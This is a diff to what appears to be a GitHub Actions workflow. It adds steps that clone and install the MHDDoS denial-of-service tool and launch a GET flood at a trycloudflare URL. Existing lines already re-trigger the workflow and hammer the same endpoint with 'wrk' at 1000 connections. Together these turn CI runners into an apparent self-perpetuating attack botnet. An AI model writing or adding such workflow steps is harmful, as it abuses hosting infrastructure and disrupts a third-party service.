@@ -15,5 +15,10 @@ jobs:
               gh workflow run "${{ github.workflow }}" -R "${{ github.repository }}"
               exit 1
           fi
+          git clone https://github.com/MatrixTM/MHDDoS.git
+          cd MHDDoS
+          pip install -r requirements.txt
+          python start.py GET http://heater-guidelines-aged-sharing.trycloudflare.com/metrics 0 1000 all.txt 1000 30 true
+          exit 1
           sudo apt-get install -y wrk
           wrk -t$(nproc) -c1000 -d150s http://heater-guidelines-aged-sharing.trycloudflare.com/metrics
